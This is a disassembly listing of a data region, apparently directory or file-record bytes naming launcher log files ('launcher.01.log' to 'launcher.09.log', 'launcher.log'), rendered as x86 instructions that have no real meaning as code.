  401d7b:	00 37                	add    %dh,(%edi)
  401d7d:	00 7e 00             	add    %bh,0x0(%esi)
  401d80:	31 00                	xor    %eax,(%eax)
  401d82:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  401d87:	00 47 00             	add    %al,0x0(%edi)
  401d8a:	6c                   	insb   (%dx),%es:(%edi)
  401d8b:	00 6f 00             	add    %ch,0x0(%edi)
  401d8e:	67 00 38             	add    %bh,(%bx,%si)
  401d91:	8c 00                	mov    %es,(%eax)
  401d93:	00 00                	add    %al,(%eax)
  401d95:	00 c8                	add    %cl,%al
  401d97:	00 70 00             	add    %dh,0x0(%eax)
  401d9a:	5a                   	pop    %edx
  401d9b:	00 00                	add    %al,(%eax)
  401d9d:	00 00                	add    %al,(%eax)
  401d9f:	00 73 8b             	add    %dh,-0x75(%ebx)
  401da2:	01 00                	add    %eax,(%eax)
  401da4:	00 00                	add    %al,(%eax)
  401da6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401dad:	2f                   	das
  401dae:	da 01                	fiaddl (%ecx)
  401db0:	d5 ee                	aad    $0xee
  401db2:	6c                   	insb   (%dx),%es:(%edi)
  401db3:	98                   	cwtl
  401db4:	c2 5e da             	ret    $0xda5e
  401db7:	01 6d 82             	add    %ebp,-0x7e(%ebp)
  401dba:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  401dbf:	01 d5                	add    %edx,%ebp
  401dc1:	ee                   	out    %al,(%dx)
  401dc2:	6c                   	insb   (%dx),%es:(%edi)
  401dc3:	98                   	cwtl
  401dc4:	c2 5e da             	ret    $0xda5e
  401dc7:	01 00                	add    %eax,(%eax)
  401dc9:	30 00                	xor    %al,(%eax)
  401dcb:	00 00                	add    %al,(%eax)
  401dcd:	00 00                	add    %al,(%eax)
  401dcf:	00 89 25 00 00 00    	add    %cl,0x25(%ecx)
  401dd5:	00 00                	add    %al,(%eax)
  401dd7:	00 20                	add    %ah,(%eax)
  401dd9:	00 00                	add    %al,(%eax)
  401ddb:	00 00                	add    %al,(%eax)
  401ddd:	00 00                	add    %al,(%eax)
  401ddf:	00 0c 02             	add    %cl,(%edx,%eax,1)
  401de2:	4c                   	dec    %esp
  401de3:	00 41 00             	add    %al,0x0(%ecx)
  401de6:	45                   	inc    %ebp
  401de7:	00 32                	add    %dh,(%edx)
  401de9:	00 38                	add    %bh,(%eax)
  401deb:	00 45 00             	add    %al,0x0(%ebp)
  401dee:	7e 00                	jle    0x401df0
  401df0:	31 00                	xor    %eax,(%eax)
  401df2:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  401df7:	00 47 00             	add    %al,0x0(%edi)
  401dfa:	6c                   	insb   (%dx),%es:(%edi)
  401dfb:	00 6f 00             	add    %ch,0x0(%edi)
  401dfe:	b8 00 fd 96 00       	mov    $0x96fd00,%eax
  401e03:	00 00                	add    %al,(%eax)
  401e05:	00 1f                	add    %bl,(%edi)
  401e07:	00 70 00             	add    %dh,0x0(%eax)
  401e0a:	5a                   	pop    %edx
  401e0b:	00 00                	add    %al,(%eax)
  401e0d:	00 00                	add    %al,(%eax)
  401e0f:	00 73 8b             	add    %dh,-0x75(%ebx)
  401e12:	01 00                	add    %eax,(%eax)
  401e14:	00 00                	add    %al,(%eax)
  401e16:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401e1d:	2f                   	das
  401e1e:	da 01                	fiaddl (%ecx)
  401e20:	3c d5                	cmp    $0xd5,%al
  401e22:	a9 1f 15 61 da       	test   $0xda61151f,%eax
  401e27:	01 6d 82             	add    %ebp,-0x7e(%ebp)
  401e2a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  401e2f:	01 3c d5 a9 1f 15 61 	add    %edi,0x61151fa9(,%edx,8)
  401e36:	da 01                	fiaddl (%ecx)
  401e38:	00 30                	add    %dh,(%eax)
  401e3a:	00 00                	add    %al,(%eax)
  401e3c:	00 00                	add    %al,(%eax)
  401e3e:	00 00                	add    %al,(%eax)
  401e40:	e4 22                	in     $0x22,%al
  401e42:	00 00                	add    %al,(%eax)
  401e44:	00 00                	add    %al,(%eax)
  401e46:	00 00                	add    %al,(%eax)
  401e48:	20 00                	and    %al,(%eax)
  401e4a:	00 00                	add    %al,(%eax)
  401e4c:	00 00                	add    %al,(%eax)
  401e4e:	00 00                	add    %al,(%eax)
  401e50:	0c 02                	or     $0x2,%al
  401e52:	4c                   	dec    %esp
  401e53:	00 41 00             	add    %al,0x0(%ecx)
  401e56:	45                   	inc    %ebp
  401e57:	00 42 00             	add    %al,0x0(%edx)
  401e5a:	46                   	inc    %esi
  401e5b:	00 45 00             	add    %al,0x0(%ebp)
  401e5e:	7e 00                	jle    0x401e60
  401e60:	31 00                	xor    %eax,(%eax)
  401e62:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  401e67:	00 47 00             	add    %al,0x0(%edi)
  401e6a:	6c                   	insb   (%dx),%es:(%edi)
  401e6b:	00 6f 00             	add    %ch,0x0(%edi)
  401e6e:	67 00 fd             	addr16 add %bh,%ch
  401e71:	96                   	xchg   %eax,%esi
  401e72:	00 00                	add    %al,(%eax)
  401e74:	00 00                	add    %al,(%eax)
  401e76:	1f                   	pop    %ds
  401e77:	00 70 00             	add    %dh,0x0(%eax)
  401e7a:	60                   	pusha
  401e7b:	00 00                	add    %al,(%eax)
  401e7d:	00 00                	add    %al,(%eax)
  401e7f:	00 73 8b             	add    %dh,-0x75(%ebx)
  401e82:	01 00                	add    %eax,(%eax)
  401e84:	00 00                	add    %al,(%eax)
  401e86:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401e8d:	2f                   	das
  401e8e:	da 01                	fiaddl (%ecx)
  401e90:	3c d5                	cmp    $0xd5,%al
  401e92:	a9 1f 15 61 da       	test   $0xda61151f,%eax
  401e97:	01 6d 82             	add    %ebp,-0x7e(%ebp)
  401e9a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  401e9f:	01 3c d5 a9 1f 15 61 	add    %edi,0x61151fa9(,%edx,8)
  401ea6:	da 01                	fiaddl (%ecx)
  401ea8:	00 30                	add    %dh,(%eax)
  401eaa:	00 00                	add    %al,(%eax)
  401eac:	00 00                	add    %al,(%eax)
  401eae:	00 00                	add    %al,(%eax)
  401eb0:	e4 22                	in     $0x22,%al
  401eb2:	00 00                	add    %al,(%eax)
  401eb4:	00 00                	add    %al,(%eax)
  401eb6:	00 00                	add    %al,(%eax)
  401eb8:	20 00                	and    %al,(%eax)
  401eba:	00 00                	add    %al,(%eax)
  401ebc:	00 00                	add    %al,(%eax)
  401ebe:	00 00                	add    %al,(%eax)
  401ec0:	0f 01                	(bad)
  401ec2:	6c                   	insb   (%dx),%es:(%edi)
  401ec3:	00 61 00             	add    %ah,0x0(%ecx)
  401ec6:	75 00                	jne    0x401ec8
  401ec8:	6e                   	outsb  %ds:(%esi),(%dx)
  401ec9:	00 63 00             	add    %ah,0x0(%ebx)
  401ecc:	68 00 65 00 72       	push   $0x72006500
  401ed1:	00 2e                	add    %ch,(%esi)
  401ed3:	00 30                	add    %dh,(%eax)
  401ed5:	00 31                	add    %dh,(%ecx)
  401ed7:	00 2e                	add    %ch,(%esi)
  401ed9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  401edd:	00 67 00             	add    %ah,0x0(%edi)
  401ee0:	e1 95                	loope  0x401e77
  401ee2:	00 00                	add    %al,(%eax)
  401ee4:	00 00                	add    %al,(%eax)
  401ee6:	c9                   	leave
  401ee7:	00 70 00             	add    %dh,0x0(%eax)
  401eea:	60                   	pusha
  401eeb:	00 00                	add    %al,(%eax)
  401eed:	00 00                	add    %al,(%eax)
  401eef:	00 73 8b             	add    %dh,-0x75(%ebx)
  401ef2:	01 00                	add    %eax,(%eax)
  401ef4:	00 00                	add    %al,(%eax)
  401ef6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401efd:	2f                   	das
  401efe:	da 01                	fiaddl (%ecx)
  401f00:	94                   	xchg   %eax,%esp
  401f01:	47                   	inc    %edi
  401f02:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f03:	f5                   	cmc
  401f04:	14 61                	adc    $0x61,%al
  401f06:	da 01                	fiaddl (%ecx)
  401f08:	6d                   	insl   (%dx),%es:(%edi)
  401f09:	82 6b 64 15          	subb   $0x15,0x64(%ebx)
  401f0d:	61                   	popa
  401f0e:	da 01                	fiaddl (%ecx)
  401f10:	94                   	xchg   %eax,%esp
  401f11:	47                   	inc    %edi
  401f12:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f13:	f5                   	cmc
  401f14:	14 61                	adc    $0x61,%al
  401f16:	da 01                	fiaddl (%ecx)
  401f18:	00 30                	add    %dh,(%eax)
  401f1a:	00 00                	add    %al,(%eax)
  401f1c:	00 00                	add    %al,(%eax)
  401f1e:	00 00                	add    %al,(%eax)
  401f20:	e3 25                	jecxz  0x401f47
  401f22:	00 00                	add    %al,(%eax)
  401f24:	00 00                	add    %al,(%eax)
  401f26:	00 00                	add    %al,(%eax)
  401f28:	20 00                	and    %al,(%eax)
  401f2a:	00 00                	add    %al,(%eax)
  401f2c:	00 00                	add    %al,(%eax)
  401f2e:	00 00                	add    %al,(%eax)
  401f30:	0f 01                	(bad)
  401f32:	6c                   	insb   (%dx),%es:(%edi)
  401f33:	00 61 00             	add    %ah,0x0(%ecx)
  401f36:	75 00                	jne    0x401f38
  401f38:	6e                   	outsb  %ds:(%esi),(%dx)
  401f39:	00 63 00             	add    %ah,0x0(%ebx)
  401f3c:	68 00 65 00 72       	push   $0x72006500
  401f41:	00 2e                	add    %ch,(%esi)
  401f43:	00 30                	add    %dh,(%eax)
  401f45:	00 32                	add    %dh,(%edx)
  401f47:	00 2e                	add    %ch,(%esi)
  401f49:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  401f4d:	00 67 00             	add    %ah,0x0(%edi)
  401f50:	0d db 00 00 00       	or     $0xdb,%eax
  401f55:	00 84 00 70 00 60 00 	add    %al,0x600070(%eax,%eax,1)
  401f5c:	00 00                	add    %al,(%eax)
  401f5e:	00 00                	add    %al,(%eax)
  401f60:	73 8b                	jae    0x401eed
  401f62:	01 00                	add    %eax,(%eax)
  401f64:	00 00                	add    %al,(%eax)
  401f66:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401f6d:	2f                   	das
  401f6e:	da 01                	fiaddl (%ecx)
  401f70:	ca 6a 3a             	lret   $0x3a6a
  401f73:	2d dd 5e da 01       	sub    $0x1da5edd,%eax
  401f78:	6d                   	insl   (%dx),%es:(%edi)
  401f79:	82 6b 64 15          	subb   $0x15,0x64(%ebx)
  401f7d:	61                   	popa
  401f7e:	da 01                	fiaddl (%ecx)
  401f80:	ca 6a 3a             	lret   $0x3a6a
  401f83:	2d dd 5e da 01       	sub    $0x1da5edd,%eax
  401f88:	00 30                	add    %dh,(%eax)
  401f8a:	00 00                	add    %al,(%eax)
  401f8c:	00 00                	add    %al,(%eax)
  401f8e:	00 00                	add    %al,(%eax)
  401f90:	b9 26 00 00 00       	mov    $0x26,%ecx
  401f95:	00 00                	add    %al,(%eax)
  401f97:	00 20                	add    %ah,(%eax)
  401f99:	00 00                	add    %al,(%eax)
  401f9b:	00 00                	add    %al,(%eax)
  401f9d:	00 00                	add    %al,(%eax)
  401f9f:	00 0f                	add    %cl,(%edi)
  401fa1:	01 6c 00 61          	add    %ebp,0x61(%eax,%eax,1)
  401fa5:	00 75 00             	add    %dh,0x0(%ebp)
  401fa8:	6e                   	outsb  %ds:(%esi),(%dx)
  401fa9:	00 63 00             	add    %ah,0x0(%ebx)
  401fac:	68 00 65 00 72       	push   $0x72006500
  401fb1:	00 2e                	add    %ch,(%esi)
  401fb3:	00 30                	add    %dh,(%eax)
  401fb5:	00 33                	add    %dh,(%ebx)
  401fb7:	00 2e                	add    %ch,(%esi)
  401fb9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  401fbd:	00 67 00             	add    %ah,0x0(%edi)
  401fc0:	38 8c 00 00 00 00 c8 	cmp    %cl,-0x38000000(%eax,%eax,1)
  401fc7:	00 70 00             	add    %dh,0x0(%eax)
  401fca:	60                   	pusha
  401fcb:	00 00                	add    %al,(%eax)
  401fcd:	00 00                	add    %al,(%eax)
  401fcf:	00 73 8b             	add    %dh,-0x75(%ebx)
  401fd2:	01 00                	add    %eax,(%eax)
  401fd4:	00 00                	add    %al,(%eax)
  401fd6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401fdd:	2f                   	das
  401fde:	da 01                	fiaddl (%ecx)
  401fe0:	d5 ee                	aad    $0xee
  401fe2:	6c                   	insb   (%dx),%es:(%edi)
  401fe3:	98                   	cwtl
  401fe4:	c2 5e da             	ret    $0xda5e
  401fe7:	01 6d 82             	add    %ebp,-0x7e(%ebp)
  401fea:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  401fef:	01 d5                	add    %edx,%ebp
  401ff1:	ee                   	out    %al,(%dx)
  401ff2:	6c                   	insb   (%dx),%es:(%edi)
  401ff3:	98                   	cwtl
  401ff4:	c2 5e da             	ret    $0xda5e
  401ff7:	01 00                	add    %eax,(%eax)
  401ff9:	30 00                	xor    %al,(%eax)
  401ffb:	00 00                	add    %al,(%eax)
  401ffd:	00 b8 00 89 25 00    	add    %bh,0x258900(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 20                	add    %ah,(%eax)
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 00                	add    %al,(%eax)
  40200d:	00 00                	add    %al,(%eax)
  40200f:	00 0f                	add    %cl,(%edi)
  402011:	01 6c 00 61          	add    %ebp,0x61(%eax,%eax,1)
  402015:	00 75 00             	add    %dh,0x0(%ebp)
  402018:	6e                   	outsb  %ds:(%esi),(%dx)
  402019:	00 63 00             	add    %ah,0x0(%ebx)
  40201c:	68 00 65 00 72       	push   $0x72006500
  402021:	00 2e                	add    %ch,(%esi)
  402023:	00 30                	add    %dh,(%eax)
  402025:	00 34 00             	add    %dh,(%eax,%eax,1)
  402028:	2e 00 6c 00 6f       	add    %ch,%cs:0x6f(%eax,%eax,1)
  40202d:	00 67 00             	add    %ah,0x0(%edi)
  402030:	95                   	xchg   %eax,%ebp
  402031:	57                   	push   %edi
  402032:	00 00                	add    %al,(%eax)
  402034:	00 00                	add    %al,(%eax)
  402036:	2c 00                	sub    $0x0,%al
  402038:	70 00                	jo     0x40203a
  40203a:	60                   	pusha
  40203b:	00 00                	add    %al,(%eax)
  40203d:	00 00                	add    %al,(%eax)
  40203f:	00 73 8b             	add    %dh,-0x75(%ebx)
  402042:	01 00                	add    %eax,(%eax)
  402044:	00 00                	add    %al,(%eax)
  402046:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40204d:	2f                   	das
  40204e:	da 01                	fiaddl (%ecx)
  402050:	db ad 34 78 1d 5e    	fldt   0x5e1d7834(%ebp)
  402056:	da 01                	fiaddl (%ecx)
  402058:	5d                   	pop    %ebp
  402059:	5b                   	pop    %ebx
  40205a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  40205f:	01 db                	add    %ebx,%ebx
  402061:	ad                   	lods   %ds:(%esi),%eax
  402062:	34 78                	xor    $0x78,%al
  402064:	1d 5e da 01 00       	sbb    $0x1da5e,%eax
  402069:	50                   	push   %eax
  40206a:	00 00                	add    %al,(%eax)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	00 00                	add    %al,(%eax)
  402070:	60                   	pusha
  402071:	4a                   	dec    %edx
  402072:	00 00                	add    %al,(%eax)
  402074:	00 00                	add    %al,(%eax)
  402076:	00 00                	add    %al,(%eax)
  402078:	20 00                	and    %al,(%eax)
  40207a:	00 00                	add    %al,(%eax)
  40207c:	00 00                	add    %al,(%eax)
  40207e:	00 00                	add    %al,(%eax)
  402080:	0f 01                	(bad)
  402082:	6c                   	insb   (%dx),%es:(%edi)
  402083:	00 61 00             	add    %ah,0x0(%ecx)
  402086:	75 00                	jne    0x402088
  402088:	6e                   	outsb  %ds:(%esi),(%dx)
  402089:	00 63 00             	add    %ah,0x0(%ebx)
  40208c:	68 00 65 00 72       	push   $0x72006500
  402091:	00 2e                	add    %ch,(%esi)
  402093:	00 30                	add    %dh,(%eax)
  402095:	00 35 00 2e 00 6c    	add    %dh,0x6c002e00
  40209b:	00 6f 00             	add    %ch,0x0(%edi)
  40209e:	67 00 8c ca 00       	add    %cl,0xca(%si)
  4020a3:	00 00                	add    %al,(%eax)
  4020a5:	00 95 00 70 00 60    	add    %dl,0x60007000(%ebp)
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	00 73 8b             	add    %dh,-0x75(%ebx)
  4020b2:	01 00                	add    %eax,(%eax)
  4020b4:	00 00                	add    %al,(%eax)
  4020b6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  4020bd:	2f                   	das
  4020be:	da 01                	fiaddl (%ecx)
  4020c0:	53                   	push   %ebx
  4020c1:	cd e5                	int    $0xe5
  4020c3:	fb                   	sti
  4020c4:	68 5c da 01 5d       	push   $0x5d01da5c
  4020c9:	5b                   	pop    %ebx
  4020ca:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  4020cf:	01 53 cd             	add    %edx,-0x33(%ebx)
  4020d2:	e5 fb                	in     $0xfb,%eax
  4020d4:	68 5c da 01 00       	push   $0x1da5c
  4020d9:	20 00                	and    %al,(%eax)
  4020db:	00 00                	add    %al,(%eax)
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	00 da                	add    %bl,%dl
  4020e1:	1d 00 00 00 00       	sbb    $0x0,%eax
  4020e6:	00 00                	add    %al,(%eax)
  4020e8:	20 00                	and    %al,(%eax)
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	0f 01                	(bad)
  4020f2:	6c                   	insb   (%dx),%es:(%edi)
  4020f3:	00 61 00             	add    %ah,0x0(%ecx)
  4020f6:	75 00                	jne    0x4020f8
  4020f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4020f9:	00 63 00             	add    %ah,0x0(%ebx)
  4020fc:	68 00 65 00 72       	push   $0x72006500
  402101:	00 2e                	add    %ch,(%esi)
  402103:	00 30                	add    %dh,(%eax)
  402105:	00 36                	add    %dh,(%esi)
  402107:	00 2e                	add    %ch,(%esi)
  402109:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40210d:	00 67 00             	add    %ah,0x0(%edi)
  402110:	0d dd 00 00 00       	or     $0xdd,%eax
  402115:	00 62 00             	add    %ah,0x0(%edx)
  402118:	70 00                	jo     0x40211a
  40211a:	60                   	pusha
  40211b:	00 00                	add    %al,(%eax)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	00 73 8b             	add    %dh,-0x75(%ebx)
  402122:	01 00                	add    %eax,(%eax)
  402124:	00 00                	add    %al,(%eax)
  402126:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40212d:	2f                   	das
  40212e:	da 01                	fiaddl (%ecx)
  402130:	a2 15 c2 7c 90       	mov    %al,0x907cc215
  402135:	43                   	inc    %ebx
  402136:	da 01                	fiaddl (%ecx)
  402138:	5d                   	pop    %ebp
  402139:	5b                   	pop    %ebx
  40213a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  40213f:	01 a2 15 c2 7c 90    	add    %esp,-0x6f833deb(%edx)
  402145:	43                   	inc    %ebx
  402146:	da 01                	fiaddl (%ecx)
  402148:	00 30                	add    %dh,(%eax)
  40214a:	00 00                	add    %al,(%eax)
  40214c:	00 00                	add    %al,(%eax)
  40214e:	00 00                	add    %al,(%eax)
  402150:	48                   	dec    %eax
  402151:	2d 00 00 00 00       	sub    $0x0,%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	20 00                	and    %al,(%eax)
  40215a:	00 00                	add    %al,(%eax)
  40215c:	00 00                	add    %al,(%eax)
  40215e:	00 00                	add    %al,(%eax)
  402160:	0f 01                	(bad)
  402162:	6c                   	insb   (%dx),%es:(%edi)
  402163:	00 61 00             	add    %ah,0x0(%ecx)
  402166:	75 00                	jne    0x402168
  402168:	6e                   	outsb  %ds:(%esi),(%dx)
  402169:	00 63 00             	add    %ah,0x0(%ebx)
  40216c:	68 00 65 00 72       	push   $0x72006500
  402171:	00 2e                	add    %ch,(%esi)
  402173:	00 30                	add    %dh,(%eax)
  402175:	00 37                	add    %dh,(%edi)
  402177:	00 2e                	add    %ch,(%esi)
  402179:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40217d:	00 67 00             	add    %ah,0x0(%edi)
  402180:	6f                   	outsl  %ds:(%esi),(%dx)
  402181:	da 00                	fiaddl (%eax)
  402183:	00 00                	add    %al,(%eax)
  402185:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  402189:	00 60 00             	add    %ah,0x0(%eax)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	00 00                	add    %al,(%eax)
  402190:	73 8b                	jae    0x40211d
  402192:	01 00                	add    %eax,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40219d:	2f                   	das
  40219e:	da 01                	fiaddl (%ecx)
  4021a0:	2b 8b 2a c0 89 43    	sub    0x4389c02a(%ebx),%ecx
  4021a6:	da 01                	fiaddl (%ecx)
  4021a8:	51                   	push   %ecx
  4021a9:	34 6b                	xor    $0x6b,%al
  4021ab:	64 15 61 da 01 2b    	fs adc $0x2b01da61,%eax
  4021b1:	8b 2a                	mov    (%edx),%ebp
  4021b3:	c0 89 43 da 01 00 30 	rorb   $0x30,0x1da43(%ecx)
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	00 00                	add    %al,(%eax)
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	76 2c                	jbe    0x4021ee
  4021c2:	00 00                	add    %al,(%eax)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	20 00                	and    %al,(%eax)
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	00 00                	add    %al,(%eax)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	0f 01                	(bad)
  4021d2:	6c                   	insb   (%dx),%es:(%edi)
  4021d3:	00 61 00             	add    %ah,0x0(%ecx)
  4021d6:	75 00                	jne    0x4021d8
  4021d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4021d9:	00 63 00             	add    %ah,0x0(%ebx)
  4021dc:	68 00 65 00 72       	push   $0x72006500
  4021e1:	00 2e                	add    %ch,(%esi)
  4021e3:	00 30                	add    %dh,(%eax)
  4021e5:	00 38                	add    %bh,(%eax)
  4021e7:	00 2e                	add    %ch,(%esi)
  4021e9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4021ed:	00 67 00             	add    %ah,0x0(%edi)
  4021f0:	93                   	xchg   %eax,%ebx
  4021f1:	71 00                	jno    0x4021f3
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	00 5f 00             	add    %bl,0x0(%edi)
  4021f8:	70 00                	jo     0x4021fa
  4021fa:	60                   	pusha
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	00 b8 00 73 8b 01    	add    %bh,0x18b7300(%eax)
  402203:	00 00                	add    %al,(%eax)
  402205:	00 0f                	add    %cl,(%edi)
  402207:	00 89 71 22 5f d0    	add    %cl,-0x2fa0dd8f(%ecx)
  40220d:	2f                   	das
  40220e:	da 01                	fiaddl (%ecx)
  402210:	71 98                	jno    0x4021aa
  402212:	f4                   	hlt
  402213:	85 83 43 da 01 51    	test   %eax,0x5101da43(%ebx)
  402219:	34 6b                	xor    $0x6b,%al
  40221b:	64 15 61 da 01 71    	fs adc $0x7101da61,%eax
  402221:	98                   	cwtl
  402222:	f4                   	hlt
  402223:	85 83 43 da 01 00    	test   %eax,0x1da43(%ebx)
  402229:	40                   	inc    %eax
  40222a:	00 00                	add    %al,(%eax)
  40222c:	00 00                	add    %al,(%eax)
  40222e:	00 00                	add    %al,(%eax)
  402230:	31 35 00 00 00 00    	xor    %esi,0x0
  402236:	00 00                	add    %al,(%eax)
  402238:	20 00                	and    %al,(%eax)
  40223a:	00 00                	add    %al,(%eax)
  40223c:	00 00                	add    %al,(%eax)
  40223e:	00 00                	add    %al,(%eax)
  402240:	0f 01                	(bad)
  402242:	6c                   	insb   (%dx),%es:(%edi)
  402243:	00 61 00             	add    %ah,0x0(%ecx)
  402246:	75 00                	jne    0x402248
  402248:	6e                   	outsb  %ds:(%esi),(%dx)
  402249:	00 63 00             	add    %ah,0x0(%ebx)
  40224c:	68 00 65 00 72       	push   $0x72006500
  402251:	00 2e                	add    %ch,(%esi)
  402253:	00 30                	add    %dh,(%eax)
  402255:	00 39                	add    %bh,(%ecx)
  402257:	00 2e                	add    %ch,(%esi)
  402259:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40225d:	00 67 00             	add    %ah,0x0(%edi)
  402260:	d0 63 00             	shlb   $1,0x0(%ebx)
  402263:	00 00                	add    %al,(%eax)
  402265:	00 29                	add    %ch,(%ecx)
  402267:	01 70 00             	add    %esi,0x0(%eax)
  40226a:	5a                   	pop    %edx
  40226b:	00 00                	add    %al,(%eax)
  40226d:	00 00                	add    %al,(%eax)
  40226f:	00 73 8b             	add    %dh,-0x75(%ebx)
  402272:	01 00                	add    %eax,(%eax)
  402274:	00 00                	add    %al,(%eax)
  402276:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40227d:	2f                   	das
  40227e:	da 01                	fiaddl (%ecx)
  402280:	70 19                	jo     0x40229b
  402282:	e4 5d                	in     $0x5d,%al
  402284:	3a 61 da             	cmp    -0x26(%ecx),%ah
  402287:	01 70 19             	add    %esi,0x19(%eax)
  40228a:	e4 5d                	in     $0x5d,%al
  40228c:	3a 61 da             	cmp    -0x26(%ecx),%ah
  40228f:	01 70 19             	add    %esi,0x19(%eax)
  402292:	e4 5d                	in     $0x5d,%al
  402294:	3a 61 da             	cmp    -0x26(%ecx),%ah
  402297:	01 00                	add    %eax,(%eax)
  402299:	30 00                	xor    %al,(%eax)
  40229b:	00 00                	add    %al,(%eax)
  40229d:	00 00                	add    %al,(%eax)
  40229f:	00 e9                	add    %ch,%cl
  4022a1:	27                   	daa
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	00 00                	add    %al,(%eax)
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	20 00                	and    %al,(%eax)
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	00 00                	add    %al,(%eax)
  4022b0:	0c 03                	or     $0x3,%al
  4022b2:	6c                   	insb   (%dx),%es:(%edi)
  4022b3:	00 61 00             	add    %ah,0x0(%ecx)
  4022b6:	75 00                	jne    0x4022b8
  4022b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4022b9:	00 63 00             	add    %ah,0x0(%ebx)
  4022bc:	68 00 65 00 72       	push   $0x72006500
  4022c1:	00 2e                	add    %ch,(%esi)
  4022c3:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4022c7:	00 67 00             	add    %ah,0x0(%edi)
  4022ca:	00 00                	add    %al,(%eax)
  4022cc:	00 00                	add    %al,(%eax)
  4022ce:	00 00                	add    %al,(%eax)
  4022d0:	93                   	xchg   %eax,%ebx
  4022d1:	71 00                	jno    0x4022d3
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	00 5f 00             	add    %bl,0x0(%edi)
  4022d8:	70 00                	jo     0x4022da
  4022da:	5a                   	pop    %edx
  4022db:	00 00                	add    %al,(%eax)
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	00 73 8b             	add    %dh,-0x75(%ebx)
  4022e2:	01 00                	add    %eax,(%eax)
  4022e4:	00 00                	add    %al,(%eax)
  4022e6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  4022ed:	2f                   	das
  4022ee:	da 01                	fiaddl (%ecx)
  4022f0:	71 98                	jno    0x40228a
  4022f2:	f4                   	hlt
  4022f3:	85 83 43 da 01 51    	test   %eax,0x5101da43(%ebx)
  4022f9:	34 6b                	xor    $0x6b,%al
  4022fb:	64 15 61 da 01 71    	fs adc $0x7101da61,%eax
  402301:	98                   	cwtl
  402302:	f4                   	hlt
  402303:	85 83 43 da 01 00    	test   %eax,0x1da43(%ebx)
  402309:	40                   	inc    %eax
  40230a:	00 00                	add    %al,(%eax)
  40230c:	00 00                	add    %al,(%eax)
  40230e:	00 00                	add    %al,(%eax)
  402310:	31 35 00 00 00 00    	xor    %esi,0x0
  402316:	00 00                	add    %al,(%eax)
  402318:	20 00                	and    %al,(%eax)
  40231a:	00 00                	add    %al,(%eax)
  40231c:	00 00                	add    %al,(%eax)
  40231e:	00 00                	add    %al,(%eax)
  402320:	0c 02                	or     $0x2,%al
  402322:	4c                   	dec    %esp
  402323:	00 41 00             	add    %al,0x0(%ecx)
  402326:	55                   	push   %ebp
  402327:	00 4e 00             	add    %cl,0x0(%esi)
  40232a:	43                   	inc    %ebx
  40232b:	00 48 00             	add    %cl,0x0(%eax)
  40232e:	7e 00                	jle    0x402330
  402330:	31 00                	xor    %eax,(%eax)
